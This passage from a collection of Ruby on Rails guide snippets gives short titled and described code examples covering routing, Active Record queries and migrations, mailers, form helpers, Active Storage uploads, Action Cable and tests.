email_contact.valid? # Validations\n=> true\n\nirb> empty_contact = EmailContact.new\nirb> empty_contact.valid?\n=> false\n```\n\n----------------------------------------\n\nTITLE: Namespaced Controller Routing in Rails\nDESCRIPTION: This shows how to specify a namespaced controller for a resource. The directory notation `admin/user_permissions` will correctly route to `Admin::UserPermissionsController`\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nresources :user_permissions, controller: \"admin/user_permissions\"\n```\n\n----------------------------------------\n\nTITLE: Adding a Foreign Key\nDESCRIPTION: This code snippet shows how to add a foreign key constraint to an existing table using `add_foreign_key`. It adds a constraint to the `articles` table to ensure the `author_id` column references a valid `id` in the `authors` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nadd_foreign_key :articles, :authors\n```\n\n----------------------------------------\n\nTITLE: Mapping City Names and IDs in Ruby\nDESCRIPTION: This Ruby code snippet retrieves all cities from the database, orders them by name, and then maps each city to an array containing its name and ID. This is used to create options for a select box.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nCity.order(:name).map { |city| [city.name, city.id] }\n```\n\n----------------------------------------\n\nTITLE: Adding Middleware with config.middleware.use and insert_after - Ruby\nDESCRIPTION: This Ruby snippet, intended for config/application.rb, demonstrates adding new Rack middleware to the Rails middleware stack using config.middleware.use (which adds to the bottom of the stack) and config.middleware.insert_after (to insert after a specific middleware). Includes the use of Rack::BounceFavicon and Lifo::Cache with arguments. Dependencies include specified middleware classes and correct Rails configuration structure. Inputs are the middleware class and any initialization arguments. No outputs are expected except for modification of the middleware stack upon server restart.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\n\\n# Push Rack::BounceFavicon at the bottom\\nconfig.middleware.use Rack::BounceFavicon\\n\\n# Add Lifo::Cache after ActionDispatch::Executor.\\n# Pass { page_cache: false } argument to Lifo::Cache.\\nconfig.middleware.insert_after ActionDispatch::Executor, Lifo::Cache, page_cache: false\n```\n\n----------------------------------------\n\nTITLE: Generated Checkboxes HTML - HTML\nDESCRIPTION: This is the HTML code generated by the checkboxes defined in the previous ERB snippet. Each checkbox has a hidden input with a value of 0 to ensure that a value is submitted even when the checkbox is not checked. The actual checkbox input has a value of 1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<input name=\"biography\" type=\"hidden\" value=\"0\" autocomplete=\"off\"><input type=\"checkbox\" value=\"1\" name=\"biography\" id=\"biography\">\n<label for=\"biography\">Biography</label>\n<input name=\"romance\" type=\"hidden\" value=\"0\" autocomplete=\"off\"><input type=\"checkbox\" value=\"1\" name=\"romance\" id=\"romance\">\n<label for=\"romance\">Romance</label>\n<input name=\"mystery\" type=\"hidden\" value=\"0\" autocomplete=\"off\"><input type=\"checkbox\" value=\"1\" name=\"mystery\" id=\"mystery\">\n<label for=\"mystery\">Mystery</label>\n```\n\n----------------------------------------\n\nTITLE: Implementing Dynamic SMTP Delivery Options in Ruby on Rails Mailer\nDESCRIPTION: Demonstrates how to override default SMTP delivery configuration using delivery_method_options within a mailer action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  def welcome_email\n    @user = params[:user]\n    @url  = user_url(@user)\n    delivery_options = { user_name: params[:company].smtp_user,\n                         password: params[:company].smtp_password,\n                         address: params[:company].smtp_host }\n    mail(to: @user.email,\n         subject: \"Please see the Terms and Conditions attached\",\n         delivery_method_options: delivery_options)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Redirecting to URLs in Rails\nDESCRIPTION: This snippet showcases how to use `redirect_to` to redirect the browser to a different URL. It illustrates redirecting to the photos index page using `photos_url`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to photos_url\n```\n\n----------------------------------------\n\nTITLE: Setting Locale from Domain Name in Ruby on Rails\nDESCRIPTION: Implements locale switching based on the top-level domain name in the ApplicationController. It extracts the locale from the host and sets it using I18n.with_locale.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\naround_action :switch_locale\n\ndef switch_locale(&action)\n  locale = extract_locale_from_tld || I18n.default_locale\n  I18n.with_locale(locale, &action)\nend\n\n# Get locale from top-level domain or return +nil+ if such locale is not available\n# You have to put something like:\n#   127.0.0.1 application.com\n#   127.0.0.1 application.it\n#   127.0.0.1 application.pl\n# in your /etc/hosts file to try this out locally\ndef extract_locale_from_tld\n  parsed_locale = request.host.split(\".\").last\n  I18n.available_locales.map(&:to_s).include?(parsed_locale) ? parsed_locale : nil\nend\n```\n\n----------------------------------------\n\nTITLE: Unscoping Order Clause in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `unscope` method to remove the order clause from an Active Record query. This allows for retrieval of records without any specific ordering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_99\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"id > 100\").limit(20).order(\"id desc\").unscope(:order)\n```\n\n----------------------------------------\n\nTITLE: Loading JavaScript Modules in Rails with Import Maps\nDESCRIPTION: Example of using script type module tag for loading JavaScript modules directly in the browser through importmap-rails integration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_26\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"module\">\n```\n\n----------------------------------------\n\nTITLE: Querying with select_all in Rails\nDESCRIPTION: Demonstrates how to use `lease_connection.select_all` to retrieve objects from the database using custom SQL without instantiating ActiveRecord objects. The result is an instance of `ActiveRecord::Result`, which can be converted to an array of hashes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_193\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.lease_connection.select_all(\"SELECT first_name, created_at FROM customers WHERE id = '1'\").to_a\n=> [{\"first_name\"=>\"Rafael\", \"created_at\"=>\"2012-11-10 23:23:45.281189\"}, {\"first_name\"=>\"Eileen\", \"created_at\"=>\"2013-12-09 11:22:35.221282\"}]\n```\n\n----------------------------------------\n\nTITLE: Finding a record by attribute in Rails\nDESCRIPTION: This code demonstrates how to find the first record matching a specific attribute using the `find_by` method. It searches for a customer with the `first_name` attribute equal to 'Lifo'. If no matching record is found, `find_by` returns `nil`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_34\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.find_by first_name: 'Lifo'\n=> #<Customer id: 1, first_name: \"Lifo\">\n\nirb> Customer.find_by first_name: 'Jon'\n=> nil\n```\n\n----------------------------------------\n\nTITLE: Testing ProductMailer in Rails\nDESCRIPTION: This snippet showcases testing a ProductMailer in a Rails application. It verifies the email subject, recipient, sender, and body content using `assert_equal` and `assert_match` assertions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_126\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ProductMailerTest < ActionMailer::TestCase\n  test \"in_stock\" do\n    mail = ProductMailer.with(product: products(:tshirt), subscriber: subscribers(:david)).in_stock\n    assert_equal \"In stock\", mail.subject\n    assert_equal [ \"david@example.org\" ], mail.to\n    assert_equal [ \"from@example.com\" ], mail.from\n    assert_match \"Good news!\", mail.body.encoded\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Collection Radio Buttons using form builder\nDESCRIPTION: This code snippet demonstrates how to generate a set of radio buttons using the `collection_radio_buttons` helper in Rails form. The radio buttons are generated from the `City.order(:name)` collection, with `:id` as the value method and `:name` as the text label method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_54\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.collection_radio_buttons :city_id, City.order(:name), :id, :name %>\n```\n\n----------------------------------------\n\nTITLE: Finding by SQL in Rails\nDESCRIPTION: This Ruby code demonstrates the use of `find_by_sql` to execute a custom SQL query and retrieve records. It joins the `customers` and `orders` tables and orders the results by customer creation time in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_192\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_by_sql(\"SELECT * FROM customers INNER JOIN orders ON customers.id = orders.customer_id ORDER BY customers.created_at desc\")\n```\n\n----------------------------------------\n\nTITLE: Action Cable Send Message JavaScript\nDESCRIPTION: This JavaScript code sets up a subscription to a chat channel and handles the `received` event to process incoming messages. It also demonstrates sending a message to the server using `chatChannel.send`. The server will rebroadcast this message to all connected clients.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/chat_channel.js\nimport consumer from \"./consumer\"\n\nconst chatChannel = consumer.subscriptions.create({ channel: \"ChatChannel\", room: \"Best Room\" }, {\n  received(data) {\n    // data => { sent_by: \"Paul\", body: \"This is a cool chat app.\" }\n  }\n})\n\nchatChannel.send({ sent_by: \"Paul\", body: \"This is a cool chat app.\" })\n```\n\n----------------------------------------\n\nTITLE: Process Recently Active Customers in Batches using `find_in_batches` in Ruby\nDESCRIPTION: This snippet demonstrates how to use `find_in_batches` on a relation to process a specific subset of customers (recently active customers) in batches.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\n# Give add_customers an array of 1000 recently active customers at a time.\nCustomer.recently_active.find_in_batches do |customers|\n  export.add_customers(customers)\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Update Action - Ruby\nDESCRIPTION: This Ruby code snippet demonstrates testing the `update` action of a controller. It retrieves an article fixture, patches the article URL with updated parameters, asserts redirection, and then reloads the article to assert that the title was successfully updated. It depends on having fixtures setup for the articles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should update article\" do\n  article = articles(:one)\n\n  patch article_url(article), params: { article: { title: \"updated\" } }\n\n  assert_redirected_to article_path(article)\n  # Reload article to refresh data and assert that title is updated.\n  article.reload\n  assert_equal \"updated\", article.title\nend\n```\n\n----------------------------------------\n\nTITLE: Run Migrations in Test Environment - Bash\nDESCRIPTION: This command runs the migrations against the `test` environment by setting the `RAILS_ENV` environment variable. It allows executing migrations against different database environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_69\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate RAILS_ENV=test\n```\n\n----------------------------------------\n\nTITLE: Skipping Callbacks with update_columns in Rails\nDESCRIPTION: This example demonstrates how to skip callbacks using the `update_columns` method in Rails.  The `update_columns` method updates the specified columns without triggering any callbacks defined in the model, such as `before_save`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  before_save :log_email_change\n\n  private\n    def log_email_change\n      if email_changed?\n        Rails.logger.info(\"Email changed from #{email_was} to #{email}\")\n      end\n    end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> user = User.find(1)\nirb> user.update_columns(email: 'new_email@example.com')\n```\n\n----------------------------------------\n\nTITLE: Generating Subscriber Model (Rails)\nDESCRIPTION: This command generates a Rails model called `Subscriber` with a `product` association and an `email` attribute. It also generates the necessary migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_99\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Subscriber product:belongs_to email\n```\n\n----------------------------------------\n\nTITLE: Processing CSV Uploads in Rails\nDESCRIPTION: This code snippet demonstrates how to handle CSV file uploads in a Rails controller. It reads the uploaded file, parses the CSV data, and processes each row. Requires the 'csv' library.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"csv\"\n\ndef upload\n  uploaded_file = params[:csv_file]\n  if uploaded_file.present?\n    csv_data = CSV.parse(uploaded_file.read, headers: true)\n    csv_data.each do |row|\n      # Process each row of the CSV file\n      # SomeInvoiceModel.create(amount: row['Amount'], status: row['Status'])\n      Rails.logger.info row.inspect\n      #<CSV::Row \"id\":\"po_1KE3FRDSYPMwkcNz9SFKuaYd\" \"Amount\":\"96.22\" \"Created (UTC)\":\"2022-01-04 02:59\" \"Arrival Date (UTC)\":\"2022-01-05 00:00\" \"Status\":\"paid\">\n    end\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Applying Database Migrations after Authentication Setup (Bash)\nDESCRIPTION: Executes the database migrations using `bin/rails db:migrate`. This command applies the changes defined in the migration files (e.g., `create_users`, `create_sessions`) generated by the `rails generate authentication` command, setting up the necessary database tables for authentication.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Rendering Rich Text Content in a View\nDESCRIPTION: This ERB code directly embeds the sanitized rich text content of the `@article.content` instance into the page.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_6\n\nLANGUAGE: erb\nCODE:\n```\n<%= @article.content %>\n```\n\n----------------------------------------\n\nTITLE: Using CDN Image URL Helper in ERB Template\nDESCRIPTION: This ERB code snippet shows how to use the custom cdn_image_url helper to generate a CDN-friendly URL for an image variant in a view template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_48\n\nLANGUAGE: erb\nCODE:\n```\n<%= cdn_image_url(user.avatar.variant(resize_to_limit: [128, 128])) %>\n```\n\n----------------------------------------\n\nTITLE: Query Caching Example in Rails Controller\nDESCRIPTION: This example shows how query caching works within a Rails controller action. The second call to Product.all will retrieve the results from the cache rather than hitting the database, but will instantiate new instances.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    # Run a find query\n    @products = Product.all\n\n    # ...\n\n    # Run the same query again\n    @products = Product.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Session Data in Rails\nDESCRIPTION: This code demonstrates how to access session data in a Rails controller using the `session` method. It shows how to store and retrieve user IDs to maintain user login status across requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  private\n    # Look up the key `:current_user_id` in the session and use it to\n    # find the current `User`. This is a common way to handle user login in\n    # a Rails application; logging in sets the session value and\n    # logging out removes it.\n    def current_user\n      @current_user ||= User.find_by(id: session[:current_user_id]) if session[:current_user_id]\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Prefixing Named Route Helpers with Scope in Rails\nDESCRIPTION: This example demonstrates prefixing multiple resources with `:as` using a scope. Resources inside `/admin` are prefixed, and resources outside remain unprefixed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nscope \"admin\", as: \"admin\" do\n  resources :photos, :accounts\nend\n\nresources :photos, :accounts\n```\n\n----------------------------------------\n\nTITLE: Attaching File with Generated Unique S3 Key in Rails\nDESCRIPTION: Demonstrates attaching a file using a custom-generated S3 key that ensures uniqueness by incorporating a UUID. This approach helps organize files while avoiding naming conflicts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(\n  io: File.open(\"/path/to/file\"),\n  filename: \"file.pdf\",\n  content_type: \"application/pdf\",\n  key: s3_file_key,\n  identify: false\n)\n```\n\n----------------------------------------\n\nTITLE: OR Condition in Rails\nDESCRIPTION: Demonstrates how to combine two relations with an `OR` condition using the `or` method.  It searches for customers with either the last name 'Smith' OR an order count in [1, 3, 5].\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(last_name: \"Smith\").or(Customer.where(orders_count: [1, 3, 5]))\n```\n\n----------------------------------------\n\nTITLE: Setting Content Type in Response - Rails\nDESCRIPTION: This snippet demonstrates how to set the content type of the HTTP response using the `response.content_type` attribute. It's commonly used in `after_action` callbacks or other scenarios where direct access to the response object is necessary.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nresponse.content_type = \"application/pdf\"\n```\n\n----------------------------------------\n\nTITLE: Attaching Images to Existing Message in Rails\nDESCRIPTION: Shows how to attach new images to an existing message object using the images.attach method, which accepts image parameters from a form submission.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(params[:images])\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailer with Sendmail\nDESCRIPTION: Basic Action Mailer configuration example using sendmail delivery method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.delivery_method = :sendmail\n# Defaults to:\n# config.action_mailer.sendmail_settings = {\n#   location: '/usr/sbin/sendmail',\n#   arguments: %w[ -i ]\n# }\nconfig.action_mailer.perform_deliveries = true\nconfig.action_mailer.raise_delivery_errors = true\nconfig.action_mailer.default_options = { from: \"no-reply@example.com\" }\n```\n\n----------------------------------------\n\nTITLE: Requiring the Core Extension in Plugin Entry Point - Ruby\nDESCRIPTION: Requires all supporting files as part of the plugin's main library entry point. This ensures 'yaffle/core_ext' is loaded so that String is extended throughout the application. Dependencies include yaffle/version, yaffle/railtie, and yaffle/core_ext.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle.rb\n\nrequire \"yaffle/version\"\nrequire \"yaffle/railtie\"\nrequire \"yaffle/core_ext\"\n\nmodule Yaffle\n  # Your code goes here...\nend\n```\n\n----------------------------------------\n\nTITLE: Employee Partial (_employee.html.erb)\nDESCRIPTION: This snippet displays the name of an employee. It expects a local variable `employee` to be passed to the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_89\n\nLANGUAGE: html+erb\nCODE:\n```\n<p>Employee: <%= employee.name %></p>\n```\n\n----------------------------------------\n\nTITLE: Disable Inverse Association on a per-association basis in Ruby\nDESCRIPTION: This snippet illustrates how to disable the inverse association on a per-association basis. The `inverse_of: nil` option in the `belongs_to` association for the `Comment` model prevents Active Record from automatically finding an inverse association in the `Post` model, even if `config.active_record.automatically_invert_plural_associations` is enabled for the application.  This provides fine-grained control over association behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass Comment < ApplicationRecord\n  self.automatically_invert_plural_associations = true\n\n  belongs_to :post, inverse_of: nil\nend\n```\n\n----------------------------------------\n\nTITLE: Modifying include Calls with ActiveSupport.on_load in Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to modify calls to `include` using `ActiveSupport.on_load`. This ensures that `MyActiveRecordHelper` is only included when `ActiveRecord::Base` is loaded, improving application performance and load order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_105\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.on_load(:active_record) do\n  # self refers to ActiveRecord::Base here,\n  # so we can call .include\n  include MyActiveRecordHelper\nend\n```\n\n----------------------------------------\n\nTITLE: Using form_with to unify form_tag and form_for in Rails views\nDESCRIPTION: The new form_with helper method unifies the functionality of form_tag and form_for, providing a more consistent API for form generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\n<%= form_with model: @user, local: true do |form| %>\n  <%= form.text_field :name %>\n  <%= form.submit %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Adding Member Route with `:on` option - Ruby\nDESCRIPTION: This snippet shows a more concise way to add a member route using the `:on` option. It achieves the same result as the previous example but with less code. The generated route is `/photos/1/preview`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos do\n  get \"preview\", on: :member\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Preload Link Tags with preload_link_tag Helper in Ruby\nDESCRIPTION: Illustrates the `preload_link_tag` helper from Action View's AssetTagHelper. It generates an HTML `<link rel=\"preload\">` tag, hinting to the browser to fetch a resource (like CSS or JavaScript) early. It automatically determines the `as` attribute based on the file type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\npreload_link_tag(\"application.css\")\n# => <link rel=\"preload\" href=\"/assets/application.css\" as=\"style\" type=\"text/css\" />\n```\n\n----------------------------------------\n\nTITLE: Removing Occurrences with remove\nDESCRIPTION: This Ruby code demonstrates the `remove` method, which removes all occurrences of a given pattern (regular expression or string) from a string and returns the modified string. There's also a destructive version, `remove!`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\n\"Hello World\".remove(/Hello /) # => \"World\"\n```\n\n----------------------------------------\n\nTITLE: Rendering Year Select Box in Rails\nDESCRIPTION: This snippet demonstrates how to use the `select_year` helper in Rails to render a select box for selecting a year. It includes the year 2024 as a default value and uses the `prefix` option to control the name and id attributes of the generated HTML.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_44\n\nLANGUAGE: erb\nCODE:\n```\n<%= select_year 2024, prefix: \"party\" %>\n```\n\n----------------------------------------\n\nTITLE: Iterate Through Customers with `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates how to iterate through all `Customer` records using the `find_each` method. It retrieves customers in batches and yields each customer to the block, which then sends a weekly newsletter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: Restricting Routes with ':only' in Rails Resources\nDESCRIPTION: Demonstrates how to limit the routes created by `resources` using the `:only` option. This example restricts the routes to only `index` and `show` actions, meaning other actions like `create` will not have corresponding routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, only: [:index, :show]\n```\n\n----------------------------------------\n\nTITLE: Enabling Strict Loading on an Association in Rails\nDESCRIPTION: Illustrates enabling strict loading for a single association by using the `strict_loading` option within the `has_many` declaration. This ensures that the association is never lazily loaded.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_160\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, strict_loading: true\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tags with image_tag Helper in Ruby\nDESCRIPTION: Illustrates the `image_tag` helper from Action View's AssetTagHelper. It generates an HTML `<img>` tag. Examples show basic usage sourcing from `app/assets/images` and adding HTML attributes like `size` (which generates `width` and `height`) and `alt`. It uses `image_path` internally.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nimage_tag(\"icon.png\")\n# => <img src=\"/assets/icon.png\" />\n```\n\nLANGUAGE: ruby\nCODE:\n```\nimage_tag(\"icon.png\", size: \"16x10\", alt: \"Edit Article\")\n# => <img src=\"/assets/icon.png\" width=\"16\" height=\"10\" alt=\"Edit Article\" />\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by find_or_initialize_by in Rails\nDESCRIPTION: This SQL query is generated by the `Customer.find_or_initialize_by(first_name: 'Nina')` command. It attempts to find a customer with the first name 'Nina'. If no such customer exists, no insertion will be performed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_191\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.first_name = 'Nina') LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Rails enum scope usage\nDESCRIPTION: This demonstrates the use of automatically generated scopes from an enum definition. `Order.shipped` returns all orders with the status `:shipped`, and `Order.not_shipped` returns all orders with a status other than `:shipped`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_177\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.shipped\n```\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.not_shipped\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Validation Methods in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to create custom validation methods in a Rails model. It shows how to register validation methods using the validate class method and how to add errors to the errors collection when validation should fail.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nclass Invoice < ApplicationRecord\n  validate :expiration_date_cannot_be_in_the_past,\n    :discount_cannot_be_greater_than_total_value\n\n  def expiration_date_cannot_be_in_the_past\n    if expiration_date.present? && expiration_date < Date.today\n      errors.add(:expiration_date, \"can't be in the past\")\n    end\n  end\n\n  def discount_cannot_be_greater_than_total_value\n    if discount > total_value\n      errors.add(:discount, \"can't be greater than total value\")\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering button with block content using button_to helper in ERB\nDESCRIPTION: Illustrates how the `button_to` helper renders a button when content is passed as a block, with `config.action_view.button_to_generates_button_tag` set to `false`. The resulting HTML will be a `<button>` tag inside a `<form>`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_55\n\nLANGUAGE: erb\nCODE:\n```\n<%= button_to \"/\" do %>\n  Content\n<% end %>\n# => <button type=\"submit\">Content</button>\n```\n\n----------------------------------------\n\nTITLE: Tracking File Upload Progress with DirectUpload\nDESCRIPTION: This JavaScript class demonstrates how to track the progress of file uploads using the DirectUpload constructor. It includes methods for handling upload progress events.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_73\n\nLANGUAGE: javascript\nCODE:\n```\nimport { DirectUpload } from \"@rails/activestorage\"\n\nclass Uploader {\n  constructor(file, url) {\n    this.upload = new DirectUpload(file, url, this)\n  }\n\n  uploadFile(file) {\n    this.upload.create((error, blob) => {\n      if (error) {\n        // Handle the error\n      } else {\n        // Add an appropriately-named hidden input to the form\n        // with a value of blob.signed_id\n      }\n    })\n  }\n\n  directUploadWillStoreFileWithXHR(request) {\n    request.upload.addEventListener(\"progress\",\n      event => this.directUploadDidProgress(event))\n  }\n\n  directUploadDidProgress(event) {\n    // Use event.loaded and event.total to update the progress bar\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Child Model with Parent for Single Table Inheritance\nDESCRIPTION: Shows how to generate a Car model that inherits from Vehicle using the --parent option, which doesn't create a separate migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_72\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model car --parent=Vehicle\n```\n\n----------------------------------------\n\nTITLE: Remove Column Migration (Ruby)\nDESCRIPTION: This migration removes the 'part_number' column (string) from the 'products' table, using the 'remove_column' method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass RemovePartNumberFromProducts < ActiveRecord::Migration[8.1]\n  def change\n    remove_column :products, :part_number, :string\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for has_many Association in Rails\nDESCRIPTION: Shows a migration that sets up the database tables for an author-book relationship, including the foreign key for the has_many association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAuthors < ActiveRecord::Migration[8.1]\n  def change\n    create_table :authors do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :books do |t|\n      t.belongs_to :author\n      t.datetime :published_at\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Inventory Count Parameter (Rails)\nDESCRIPTION: This code snippet modifies the `product_params` method in the controller to permit the `inventory_count` parameter. This allows the controller to accept and process the `inventory_count` value from the form.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\n    def product_params\n      params.expect(product: [ :name, :description, :featured_image, :inventory_count ])\n    end\n```\n\n----------------------------------------\n\nTITLE: Using Custom Contexts with Save Method in Rails\nDESCRIPTION: This snippet demonstrates how to trigger validations with custom contexts when saving a record. It shows how to use the context parameter with the save 